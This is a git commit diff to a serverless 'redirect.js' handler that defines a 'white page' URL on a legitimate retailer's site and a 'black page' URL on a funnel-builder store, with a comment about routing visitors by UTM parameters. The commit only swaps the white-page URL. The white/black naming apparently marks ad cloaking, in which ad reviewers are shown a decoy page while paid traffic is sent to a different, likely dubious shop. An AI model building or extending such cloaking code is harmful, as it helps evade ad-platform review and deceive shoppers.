5bd183fa5fb19344ba61a23d22f0f05a91ab2a38
Asif-Moon <asifaslam.ch94@gmail.com>
2025-01-26 01:52:27 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.hollisterco.com/shop/wd/p/easy-babydoll-top-56725340?categoryId=120723&faceout=model&seq=02";
+    const whitePageURL = "https://oakandfort.com/products/sleeveless-suiting";
     const blackPageURL = "https://adffuaorrd.myfunnelish.com/chelsea-boden-boots-1737384020203844";
   
     // Parse the UTM parameters from the request URL
